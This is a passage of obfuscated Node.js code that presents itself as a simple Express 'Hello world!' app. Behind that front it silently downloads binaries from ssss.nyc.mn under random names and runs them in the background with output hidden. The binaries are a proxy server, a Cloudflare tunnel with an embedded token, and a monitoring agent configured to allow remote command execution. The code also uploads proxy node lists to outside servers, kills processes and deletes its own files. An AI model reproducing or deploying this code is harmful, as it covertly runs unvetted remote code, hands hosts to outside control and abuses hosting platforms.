const _0x15359e=_0x30a6;(function(_0x2ae5a7,_0x1ac0a8){const _0x572b28={_0x5c4dd7:0x257,_0x41d2fc:0x1d0,_0x1f5db8:0x1f9,_0x4599c3:0x268,_0x419e1b:0x26f,_0x37b865:0x26b},_0xd5450c=_0x30a6,_0x29cc71=_0x2ae5a7();while(!![]){try{const _0x1015bb=parseInt(_0xd5450c(0x279))/0x1*(parseInt(_0xd5450c(_0x572b28._0x5c4dd7))/0x2)+parseInt(_0xd5450c(_0x572b28._0x41d2fc))/0x3*(parseInt(_0xd5450c(_0x572b28._0x1f5db8))/0x4)+-parseInt(_0xd5450c(0x211))/0x5+parseInt(_0xd5450c(0x1f0))/0x6*(-parseInt(_0xd5450c(_0x572b28._0x4599c3))/0x7)+-parseInt(_0xd5450c(_0x572b28._0x419e1b))/0x8*(parseInt(_0xd5450c(0x240))/0x9)+-parseInt(_0xd5450c(0x27a))/0xa*(parseInt(_0xd5450c(_0x572b28._0x37b865))/0xb)+parseInt(_0xd5450c(0x267))/0xc;if(_0x1015bb===_0x1ac0a8)break;else _0x29cc71['push'](_0x29cc71['shift']());}catch(_0x7e5177){_0x29cc71['push'](_0x29cc71['shift']());}}}(_0x7f84,0x4a4ec));const express=require(_0x15359e(0x25f)),app=express(),axios=require(_0x15359e(0x1d9)),os=require('os'),fs=require('fs'),path=require(_0x15359e(0x228)),{promisify}=require(_0x15359e(0x1f2)),exec=promisify(require(_0x15359e(0x273))[_0x15359e(0x249)]),{execSync}=require(_0x15359e(0x273)),UPLOAD_URL=process[_0x15359e(0x20c)][_0x15359e(0x254)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x15359e(0x20c)][_0x15359e(0x207)]||![],FILE_PATH=process[_0x15359e(0x20c)][_0x15359e(0x1be)]||_0x15359e(0x1fd),SUB_PATH=process[_0x15359e(0x20c)][_0x15359e(0x237)]||_0x15359e(0x200),PORT=process[_0x15359e(0x20c)][_0x15359e(0x1e0)]||process[_0x15359e(0x20c)]['PORT']||0xbb8,UUID=process[_0x15359e(0x20c)][_0x15359e(0x1e9)]||_0x15359e(0x1dd),NEZHA_SERVER=process[_0x15359e(0x20c)][_0x15359e(0x236)]||'',NEZHA_PORT=process[_0x15359e(0x20c)][_0x15359e(0x21b)]||'',NEZHA_KEY=process[_0x15359e(0x20c)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x15359e(0x217)]||_0x15359e(0x216),ARGO_AUTH=process['env'][_0x15359e(0x27e)]||_0x15359e(0x23f),ARGO_PORT=process[_0x15359e(0x20c)][_0x15359e(0x274)]||0x1f41,CFIP=process[_0x15359e(0x20c)][_0x15359e(0x1ea)]||'cdns.doon.eu.org',CFPORT=process[_0x15359e(0x20c)][_0x15359e(0x24e)]||0x1bb,NAME=process[_0x15359e(0x20c)][_0x15359e(0x1cf)]||_0x15359e(0x1f1);function _0x7f84(){const _0x2fc2ab=['tunnel.yml','Hello\x20world!','tunnel.json','NEZHA_PORT','toString','127.0.0.1','arm64','\x0a\x20\x20credentials-file:\x20','application/json','\x20>/dev/null\x202>&1','\x20is\x20running','\x20is\x20created','get','random','chmod','utf-8','path','mkdirSync','/api/add-subscriptions','pop','catch','message','aarch64','existsSync','filter','&fp=firefox&type=ws&host=','clear','443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','del\x20/f\x20/q\x20','NEZHA_SERVER','SUB_PATH','response','App\x20is\x20running','platform','arch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20>\x20nul\x202>&1','post','eyJhIjoiNzFjNzIyZGEzOGEwYTM1NTY0MTM2YjdlMzJkOGZjMzAiLCJ0IjoiNTU1NWU1NDMtMTdhMS00MDBjLWI2NDYtYzIxNWY1ZWYzY2IxIiwicyI6Ik5XUXlNREJsTWpFdE1EQmpaUzAwTVdSbUxXSmhZemN0TURBd1l6WTBaRGcxTXpsaCJ9','616365xypjlL','tcp','?security=tls&sni=','https://amd64.ssss.nyc.mn/bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-c\x20\x22','NEZHA\x20variable\x20is\x20empty,skip\x20running','block','Add\x20automatic\x20access\x20task\x20faild:\x20','exec','success','&path=%2Fvless-argo%3Fed%3D2560#','/config.json\x20>/dev/null\x202>&1\x20&','/vmess-argo?ed=2560','CFPORT','unshift','/api/delete-nodes','boot.log','\x20-p\x20','blackhole','UPLOAD_URL','Unhandled\x20error\x20in\x20startserver:','split','472084pDxISi','vless','send','pkill\x20-f\x20\x22[','8443','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','rm\x20-rf\x20','config.yaml','express','readdirSync','Error\x20in\x20startserver:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20successfully','charAt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','country_code','11019144wJmlSd','814373frIeBS','\x0avless://','fileName','196449UNlETe','log','TunnelSecret','/trojan-argo','24dnasxU','?encryption=none&security=tls&sni=','createWriteStream','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','child_process','ARGO_PORT','none','push','2096','2087','2JqCCSf','160cdEVZI','arm','isFile','pipe','ARGO_AUTH','taskkill\x20/f\x20/im\x20','FILE_PATH','http\x20server\x20is\x20running\x20on\x20port:','firefox','writeFileSync','ArgoDomain:','--tls','map','org','error','quic','win32','abcdefghijklmnopqrstuvwxyz','/vmess-argo','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/agent','includes','npm\x20running\x20error:\x20','NAME','146154vpvsvQ','https://arm64.ssss.nyc.mn/v1','match','nohup\x20','unlinkSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','forEach','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','http://ip-api.com/json/','axios','&path=%2Ftrojan-argo%3Fed%3D2560#','readFileSync','direct','6b5d2b69-ccdc-43d7-8f0a-a39e472a0419','true','unlink','SERVER_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/web','\x20failed:\x20','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','/vless-argo','UUID','CFIP','from','stringify','test','length','https://oooo.serv00.net/add-url','30xUgptX','eee','util','has','\x20-s\x20','Subscription\x20uploaded\x20successfully','set','close','status','4DINGsv','listen','config.json','2053','./tmp','/dev/null','tls','sub-test','Content-Type','Empowerment\x20success\x20for\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','web\x20running\x20error:\x20','http','floor','AUTO_ACCESS','stream','base64','text/plain;\x20charset=utf-8','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','env','all','join','vmess','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','309030IUTZtl','Error\x20executing\x20command:\x20','basename','freedom','list.txt','appxini.xinyangme001.dpdns.org','ARGO_DOMAIN'];_0x7f84=function(){return _0x2fc2ab;};return _0x7f84();}!fs['existsSync'](FILE_PATH)?(fs[_0x15359e(0x229)](FILE_PATH),console[_0x15359e(0x26c)](FILE_PATH+_0x15359e(0x223))):console[_0x15359e(0x26c)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4b0716={_0x43cb5f:0x1c9,_0x1dd5a1:0x264,_0x25f8b6:0x225},_0x4dd49=_0x15359e,_0x592961=_0x4dd49(_0x4b0716._0x43cb5f);let _0x3337c4='';for(let _0x272622=0x0;_0x272622<0x6;_0x272622++){_0x3337c4+=_0x592961[_0x4dd49(_0x4b0716._0x1dd5a1)](Math[_0x4dd49(0x206)](Math[_0x4dd49(_0x4b0716._0x25f8b6)]()*_0x592961[_0x4dd49(0x1ee)]));}return _0x3337c4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x30a6(_0x49b116,_0x2b9532){const _0x7f843a=_0x7f84();return _0x30a6=function(_0x30a6a7,_0x90eac6){_0x30a6a7=_0x30a6a7-0x1be;let _0x8af878=_0x7f843a[_0x30a6a7];return _0x8af878;},_0x30a6(_0x49b116,_0x2b9532);}let npmPath=path[_0x15359e(0x20e)](FILE_PATH,npmName),phpPath=path[_0x15359e(0x20e)](FILE_PATH,phpName),webPath=path[_0x15359e(0x20e)](FILE_PATH,webName),botPath=path[_0x15359e(0x20e)](FILE_PATH,botName),subPath=path[_0x15359e(0x20e)](FILE_PATH,'sub.txt'),listPath=path[_0x15359e(0x20e)](FILE_PATH,_0x15359e(0x215)),bootLogPath=path['join'](FILE_PATH,_0x15359e(0x251)),configPath=path[_0x15359e(0x20e)](FILE_PATH,_0x15359e(0x1fb));function deleteNodes(){const _0x3559a1={_0x5f39ce:0x1db,_0x828433:0x227,_0x1c155a:0x209,_0x331681:0x230,_0x5599d7:0x1ec},_0x583632=_0x15359e;try{if(!UPLOAD_URL)return;if(!fs[_0x583632(0x22f)](subPath))return;let _0x52c788;try{_0x52c788=fs[_0x583632(_0x3559a1._0x5f39ce)](subPath,_0x583632(_0x3559a1._0x828433));}catch{return null;}const _0x249b81=Buffer['from'](_0x52c788,_0x583632(_0x3559a1._0x1c155a))['toString']('utf-8'),_0x26afbf=_0x249b81[_0x583632(0x256)]('\x0a')[_0x583632(_0x3559a1._0x331681)](_0x38c60a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x38c60a));if(_0x26afbf['length']===0x0)return;return axios[_0x583632(0x23e)](UPLOAD_URL+_0x583632(0x250),JSON[_0x583632(_0x3559a1._0x5599d7)]({'nodes':_0x26afbf}),{'headers':{'Content-Type':_0x583632(0x220)}})[_0x583632(0x22c)](_0x5183be=>{return null;}),null;}catch(_0x48c770){return null;}}function cleanupOldFiles(){const _0x1bf713={_0x4cee05:0x260},_0x3a2aec={_0x207001:0x20e},_0x586af4=_0x15359e;try{const _0x5c2fa4=fs[_0x586af4(_0x1bf713._0x4cee05)](FILE_PATH);_0x5c2fa4['forEach'](_0x5b9747=>{const _0x3a75d9=_0x586af4,_0x52733c=path[_0x3a75d9(_0x3a2aec._0x207001)](FILE_PATH,_0x5b9747);try{const _0x53d2a1=fs['statSync'](_0x52733c);_0x53d2a1[_0x3a75d9(0x27c)]()&&fs[_0x3a75d9(0x1d4)](_0x52733c);}catch(_0x2230f7){}});}catch(_0x32e350){}}app[_0x15359e(0x224)]('/',function(_0x28a01d,_0x1c68f8){const _0x4b6c14={_0xd3c8ee:0x259},_0x21be81=_0x15359e;_0x1c68f8[_0x21be81(_0x4b6c14._0xd3c8ee)](_0x21be81(0x219));});async function generateConfig(){const _0x3ed07a={_0xf477b6:0x1fe,_0x225d70:0x258,_0x506ba0:0x1e8,_0xcbd1c2:0x26e,_0xfe7050:0x241,_0x4d3df1:0x275,_0x2b1194:0x275,_0x15f240:0x1c7,_0x870efb:0x21d,_0x3962dc:0x20f,_0x2f4533:0x1ca,_0x2d0081:0x26e,_0x46084a:0x214,_0x382ac2:0x1dc,_0x355402:0x253,_0x15de88:0x1c1},_0x343a3b=_0x15359e,_0x3a0106={'log':{'access':_0x343a3b(0x1fe),'error':_0x343a3b(_0x3ed07a._0xf477b6),'loglevel':_0x343a3b(0x275)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x343a3b(_0x3ed07a._0x225d70),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x343a3b(0x275),'fallbacks':[{'dest':0xbb9},{'path':_0x343a3b(_0x3ed07a._0x506ba0),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x343a3b(_0x3ed07a._0xcbd1c2),'dest':0xbbc}]},'streamSettings':{'network':_0x343a3b(_0x3ed07a._0xfe7050)}},{'port':0xbb9,'listen':_0x343a3b(0x21d),'protocol':_0x343a3b(_0x3ed07a._0x225d70),'settings':{'clients':[{'id':UUID}],'decryption':_0x343a3b(_0x3ed07a._0x4d3df1)},'streamSettings':{'network':_0x343a3b(0x241),'security':_0x343a3b(0x275)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x343a3b(_0x3ed07a._0x4d3df1)},'streamSettings':{'network':'ws','security':_0x343a3b(_0x3ed07a._0x2b1194),'wsSettings':{'path':_0x343a3b(_0x3ed07a._0x506ba0)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x343a3b(_0x3ed07a._0x15f240)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x343a3b(_0x3ed07a._0x870efb),'protocol':_0x343a3b(_0x3ed07a._0x3962dc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x343a3b(_0x3ed07a._0x2f4533)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x343a3b(0x1ff),_0x343a3b(_0x3ed07a._0x15f240)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x343a3b(_0x3ed07a._0x870efb),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x343a3b(_0x3ed07a._0x2d0081)}},'sniffing':{'enabled':!![],'destOverride':[_0x343a3b(0x205),'tls',_0x343a3b(0x1c7)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x343a3b(_0x3ed07a._0x46084a),'tag':_0x343a3b(_0x3ed07a._0x382ac2)},{'protocol':_0x343a3b(_0x3ed07a._0x355402),'tag':_0x343a3b(0x247)}]};fs[_0x343a3b(_0x3ed07a._0x15de88)](path['join'](FILE_PATH,'config.json'),JSON[_0x343a3b(0x1ec)](_0x3a0106,null,0x2));}function getSystemArchitecture(){const _0x26a5be={_0x1d42b6:0x23b},_0x39eb85=_0x15359e,_0x2d35e4=os[_0x39eb85(_0x26a5be._0x1d42b6)]();return _0x2d35e4===_0x39eb85(0x27b)||_0x2d35e4===_0x39eb85(0x21e)||_0x2d35e4===_0x39eb85(0x22e)?'arm':'amd';}function downloadFile(_0x1f1547,_0x1cd0c6,_0x1920c2){const _0x2376fb={_0x567644:0x271,_0x7009e7:0x224,_0x385757:0x208},_0x48d655={_0x14dea1:0x1e5,_0x4e4364:0x1e4,_0x2b386d:0x1c6},_0x47e5dd={_0xda1572:0x1e7},_0x24dab9=_0x15359e,_0x48a574=_0x1f1547;!fs[_0x24dab9(0x22f)](FILE_PATH)&&fs[_0x24dab9(0x229)](FILE_PATH,{'recursive':!![]});const _0xc16f4d=fs[_0x24dab9(_0x2376fb._0x567644)](_0x48a574);axios({'method':_0x24dab9(_0x2376fb._0x7009e7),'url':_0x1cd0c6,'responseType':_0x24dab9(_0x2376fb._0x385757)})['then'](_0x2d8f8b=>{const _0x1acfe5={_0x452cd8:0x1df},_0x5762b6={_0x3a7126:0x26c,_0x2ddb83:0x263},_0xaa3fd4=_0x24dab9;_0x2d8f8b[_0xaa3fd4(_0x47e5dd._0xda1572)][_0xaa3fd4(0x27d)](_0xc16f4d),_0xc16f4d['on']('finish',()=>{const _0x4673f9=_0xaa3fd4;_0xc16f4d[_0x4673f9(0x1f7)](),console[_0x4673f9(_0x5762b6._0x3a7126)]('Download\x20'+path[_0x4673f9(0x213)](_0x48a574)+_0x4673f9(_0x5762b6._0x2ddb83)),_0x1920c2(null,_0x48a574);}),_0xc16f4d['on']('error',_0x10fe0d=>{const _0x32407f=_0xaa3fd4;fs[_0x32407f(_0x1acfe5._0x452cd8)](_0x48a574,()=>{});const _0x4a5d91=_0x32407f(0x1e5)+path['basename'](_0x48a574)+'\x20failed:\x20'+_0x10fe0d[_0x32407f(0x22d)];console['error'](_0x4a5d91),_0x1920c2(_0x4a5d91);});})[_0x24dab9(0x22c)](_0x5449dd=>{const _0x3f0579=_0x24dab9,_0x12e238=_0x3f0579(_0x48d655._0x14dea1)+path[_0x3f0579(0x213)](_0x48a574)+_0x3f0579(_0x48d655._0x4e4364)+_0x5449dd[_0x3f0579(0x22d)];console[_0x3f0579(_0x48d655._0x2b386d)](_0x12e238),_0x1920c2(_0x12e238);});}async function downloadFilesAndRun(){const _0xe604a1={_0x532623:0x26c,_0x11c520:0x1c4,_0x3effbd:0x1cd,_0x2df7ff:0x256,_0x2caa4c:0x22b,_0x196a22:0x277,_0x2618dd:0x1f3,_0x2cd9e7:0x1de,_0x3e0730:0x1e6,_0x32911d:0x1c6,_0x3272c9:0x233,_0x34a099:0x278,_0x5a3237:0x1fc,_0xb3d679:0x1d3,_0xc54c0a:0x1c6,_0x28b32c:0x246,_0x52c6ba:0x1d3,_0x33f468:0x204,_0x56aa8d:0x1d2,_0x368a80:0x234,_0x5a2da1:0x244,_0x57373a:0x26c,_0x4057d6:0x222,_0x1910a4:0x212},_0x4ec67d=_0x15359e,_0x2712a5=getSystemArchitecture(),_0x5b75c5=getFilesForArchitecture(_0x2712a5);if(_0x5b75c5[_0x4ec67d(0x1ee)]===0x0){console[_0x4ec67d(_0xe604a1._0x532623)](_0x4ec67d(0x25c));return;}const _0x1c67ae=_0x5b75c5[_0x4ec67d(_0xe604a1._0x11c520)](_0x176714=>{const _0x5ef4b1={_0x48f54b:0x26a};return new Promise((_0x1b41bf,_0x597f50)=>{const _0x1c867f=_0x30a6;downloadFile(_0x176714[_0x1c867f(_0x5ef4b1._0x48f54b)],_0x176714['fileUrl'],(_0x35baf9,_0x269ee5)=>{_0x35baf9?_0x597f50(_0x35baf9):_0x1b41bf(_0x269ee5);});});});try{await Promise[_0x4ec67d(0x20d)](_0x1c67ae);}catch(_0x1d985f){console['error']('Error\x20downloading\x20files:',_0x1d985f);return;}function _0x4c8cca(_0x2ab3ab){const _0x24b1b2={_0xec5f49:0x202},_0x416ae1=_0x4ec67d,_0x2ce1aa=0x1fd;_0x2ab3ab[_0x416ae1(0x1d6)](_0x267b7a=>{const _0x535db5=_0x416ae1;fs[_0x535db5(0x22f)](_0x267b7a)&&fs[_0x535db5(0x226)](_0x267b7a,_0x2ce1aa,_0x5778a7=>{const _0x5022aa=_0x535db5;_0x5778a7?console[_0x5022aa(0x1c6)]('Empowerment\x20failed\x20for\x20'+_0x267b7a+':\x20'+_0x5778a7):console['log'](_0x5022aa(_0x24b1b2._0xec5f49)+_0x267b7a+':\x20'+_0x2ce1aa[_0x5022aa(0x21c)](0x8));});});}const _0x25aa33=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c8cca(_0x25aa33);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1eef98=NEZHA_SERVER[_0x4ec67d(_0xe604a1._0x3effbd)](':')?NEZHA_SERVER[_0x4ec67d(_0xe604a1._0x2df7ff)](':')[_0x4ec67d(_0xe604a1._0x2caa4c)]():'',_0x44c86a=new Set(['443',_0x4ec67d(0x25b),_0x4ec67d(_0xe604a1._0x196a22),_0x4ec67d(0x278),'2083',_0x4ec67d(0x1fc)]),_0x16e3a3=_0x44c86a[_0x4ec67d(_0xe604a1._0x2618dd)](_0x1eef98)?_0x4ec67d(_0xe604a1._0x2cd9e7):'false',_0x4738fb='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4ec67d(0x210)+NEZHA_SERVER+_0x4ec67d(_0xe604a1._0x3e0730)+_0x16e3a3+_0x4ec67d(0x1d5)+UUID;fs[_0x4ec67d(0x1c1)](path[_0x4ec67d(0x20e)](FILE_PATH,_0x4ec67d(0x25e)),_0x4738fb);const _0xbbfb2e=_0x4ec67d(0x1d3)+phpPath+_0x4ec67d(0x245)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0xbbfb2e),console[_0x4ec67d(0x26c)](phpName+'\x20is\x20running'),await new Promise(_0x14fc4a=>setTimeout(_0x14fc4a,0x3e8));}catch(_0x1a98b5){console[_0x4ec67d(_0xe604a1._0x32911d)]('php\x20running\x20error:\x20'+_0x1a98b5);}}else{let _0x715b7b='';const _0x17fd51=[_0x4ec67d(_0xe604a1._0x3272c9),_0x4ec67d(0x25b),_0x4ec67d(_0xe604a1._0x196a22),_0x4ec67d(_0xe604a1._0x34a099),'2083',_0x4ec67d(_0xe604a1._0x5a3237)];_0x17fd51[_0x4ec67d(0x1cd)](NEZHA_PORT)&&(_0x715b7b=_0x4ec67d(0x1c3));const _0xaf3a94=_0x4ec67d(_0xe604a1._0xb3d679)+npmPath+_0x4ec67d(0x1f4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ec67d(0x252)+NEZHA_KEY+'\x20'+_0x715b7b+_0x4ec67d(0x23c);try{await exec(_0xaf3a94),console['log'](npmName+_0x4ec67d(0x222)),await new Promise(_0x5d579a=>setTimeout(_0x5d579a,0x3e8));}catch(_0x2dd0e1){console[_0x4ec67d(_0xe604a1._0xc54c0a)](_0x4ec67d(0x1ce)+_0x2dd0e1);}}}else console[_0x4ec67d(0x26c)](_0x4ec67d(_0xe604a1._0x28b32c));const _0x3869ff=_0x4ec67d(_0xe604a1._0x52c6ba)+webPath+'\x20-c\x20'+FILE_PATH+_0x4ec67d(0x24c);try{await exec(_0x3869ff),console[_0x4ec67d(_0xe604a1._0x532623)](webName+'\x20is\x20running'),await new Promise(_0xbdc422=>setTimeout(_0xbdc422,0x3e8));}catch(_0x2329bd){console[_0x4ec67d(0x1c6)](_0x4ec67d(_0xe604a1._0x33f468)+_0x2329bd);}if(fs['existsSync'](botPath)){let _0x5b6fe6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5b6fe6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4ec67d(_0xe604a1._0x56aa8d)](/TunnelSecret/)?_0x5b6fe6=_0x4ec67d(_0xe604a1._0x368a80)+FILE_PATH+'/tunnel.yml\x20run':_0x5b6fe6=_0x4ec67d(0x1e1)+FILE_PATH+_0x4ec67d(_0xe604a1._0x5a2da1)+ARGO_PORT;try{await exec(_0x4ec67d(_0xe604a1._0x52c6ba)+botPath+'\x20'+_0x5b6fe6+'\x20>/dev/null\x202>&1\x20&'),console[_0x4ec67d(_0xe604a1._0x57373a)](botName+_0x4ec67d(_0xe604a1._0x4057d6)),await new Promise(_0x3c943e=>setTimeout(_0x3c943e,0x7d0));}catch(_0x474fc6){console[_0x4ec67d(_0xe604a1._0xc54c0a)](_0x4ec67d(_0xe604a1._0x1910a4)+_0x474fc6);}}await new Promise(_0x4f8b3b=>setTimeout(_0x4f8b3b,0x1388));}function getFilesForArchitecture(_0x3012f3){const _0x29e5ed={_0x22252a:0x1e3,_0x399886:0x243,_0x419fd2:0x27b,_0x41e484:0x1cc,_0x3ce0b4:0x1d1,_0x5a4ae5:0x24f},_0x3e003f=_0x15359e;let _0x275a60;_0x3012f3===_0x3e003f(0x27b)?_0x275a60=[{'fileName':webPath,'fileUrl':_0x3e003f(_0x29e5ed._0x22252a)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x275a60=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3e003f(_0x29e5ed._0x399886)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1308b0=_0x3012f3===_0x3e003f(_0x29e5ed._0x419fd2)?'https://arm64.ssss.nyc.mn/agent':_0x3e003f(_0x29e5ed._0x41e484);_0x275a60[_0x3e003f(0x24f)]({'fileName':npmPath,'fileUrl':_0x1308b0});}else{const _0x25ec0a=_0x3012f3===_0x3e003f(_0x29e5ed._0x419fd2)?_0x3e003f(_0x29e5ed._0x3ce0b4):'https://amd64.ssss.nyc.mn/v1';_0x275a60[_0x3e003f(_0x29e5ed._0x5a4ae5)]({'fileName':phpPath,'fileUrl':_0x25ec0a});}}return _0x275a60;}function argoType(){const _0x2b48df={_0x525893:0x1c1,_0x2c3701:0x1cb,_0x656b70:0x21f,_0x52ab19:0x20e,_0x507132:0x21a,_0x3f804a:0x20b,_0x5c29ec:0x218},_0x5eedc0=_0x15359e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5eedc0(0x26c)](_0x5eedc0(0x1d7));return;}if(ARGO_AUTH['includes'](_0x5eedc0(0x26d))){fs[_0x5eedc0(_0x2b48df._0x525893)](path[_0x5eedc0(0x20e)](FILE_PATH,_0x5eedc0(0x21a)),ARGO_AUTH);const _0x5574d4=_0x5eedc0(_0x2b48df._0x2c3701)+ARGO_AUTH['split']('\x22')[0xb]+_0x5eedc0(_0x2b48df._0x656b70)+path[_0x5eedc0(_0x2b48df._0x52ab19)](FILE_PATH,_0x5eedc0(_0x2b48df._0x507132))+_0x5eedc0(_0x2b48df._0x3f804a)+ARGO_DOMAIN+_0x5eedc0(0x262)+ARGO_PORT+_0x5eedc0(0x265);fs['writeFileSync'](path['join'](FILE_PATH,_0x5eedc0(_0x2b48df._0x5c29ec)),_0x5574d4);}else console[_0x5eedc0(0x26c)](_0x5eedc0(0x272));}async function extractDomains(){const _0x551cbe={_0x4b4c4d:0x26c,_0x3176e1:0x1db,_0x28b273:0x227,_0x237c6b:0x1d6,_0x53bdfd:0x1c2,_0x1ac0ca:0x26c,_0x581fa4:0x1d4,_0x32647a:0x244,_0x37b418:0x212,_0x145ceb:0x1c6},_0x544189={_0x51ab09:0x266,_0x456a25:0x1c5,_0x761e47:0x1e7,_0x331bea:0x266,_0x32dfeb:0x1e7,_0x689957:0x224,_0x4546e1:0x1d8,_0x280d65:0x1f8,_0x24382a:0x24a},_0x2e9de6={_0x349abe:0x23a,_0x147069:0x27f,_0x795a22:0x25a},_0x54f6cc={_0x453aed:0x1d2},_0x474b39=_0x15359e;let _0x23e136;if(ARGO_AUTH&&ARGO_DOMAIN)_0x23e136=ARGO_DOMAIN,console[_0x474b39(_0x551cbe._0x4b4c4d)]('ARGO_DOMAIN:',_0x23e136),await _0x133460(_0x23e136);else try{const _0x3d544b=fs[_0x474b39(_0x551cbe._0x3176e1)](path[_0x474b39(0x20e)](FILE_PATH,_0x474b39(0x251)),_0x474b39(_0x551cbe._0x28b273)),_0x2ab106=_0x3d544b['split']('\x0a'),_0x421d5a=[];_0x2ab106[_0x474b39(_0x551cbe._0x237c6b)](_0x2a6cc0=>{const _0x33b563=_0x474b39,_0x5d58d9=_0x2a6cc0[_0x33b563(_0x54f6cc._0x453aed)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5d58d9){const _0x3cd119=_0x5d58d9[0x1];_0x421d5a['push'](_0x3cd119);}});if(_0x421d5a[_0x474b39(0x1ee)]>0x0)_0x23e136=_0x421d5a[0x0],console[_0x474b39(_0x551cbe._0x4b4c4d)](_0x474b39(_0x551cbe._0x53bdfd),_0x23e136),await _0x133460(_0x23e136);else{console[_0x474b39(_0x551cbe._0x1ac0ca)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x474b39(_0x551cbe._0x581fa4)](path['join'](FILE_PATH,_0x474b39(0x251)));async function _0x34d59b(){const _0x45c6c9=_0x474b39;try{process[_0x45c6c9(_0x2e9de6._0x349abe)]==='win32'?await exec(_0x45c6c9(_0x2e9de6._0x147069)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x45c6c9(_0x2e9de6._0x795a22)+botName[_0x45c6c9(0x264)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x496c4d){}}_0x34d59b(),await new Promise(_0x491610=>setTimeout(_0x491610,0xbb8));const _0x495979='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x474b39(_0x551cbe._0x32647a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x495979+'\x20>/dev/null\x202>&1\x20&'),console[_0x474b39(0x26c)](botName+'\x20is\x20running'),await new Promise(_0x569036=>setTimeout(_0x569036,0xbb8)),await extractDomains();}catch(_0x485e00){console[_0x474b39(0x1c6)](_0x474b39(_0x551cbe._0x37b418)+_0x485e00);}}}catch(_0x48a9e3){console[_0x474b39(_0x551cbe._0x145ceb)]('Error\x20reading\x20boot.log:',_0x48a9e3);}async function _0x42da7e(){const _0x448694=_0x474b39;try{const _0x33e6b6=await axios[_0x448694(0x224)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x33e6b6['data']&&_0x33e6b6[_0x448694(0x1e7)][_0x448694(_0x544189._0x51ab09)]&&_0x33e6b6[_0x448694(0x1e7)][_0x448694(_0x544189._0x456a25)])return _0x33e6b6[_0x448694(_0x544189._0x761e47)][_0x448694(_0x544189._0x331bea)]+'_'+_0x33e6b6[_0x448694(_0x544189._0x32dfeb)][_0x448694(0x1c5)];}catch(_0x3b8179){try{const _0x1681fd=await 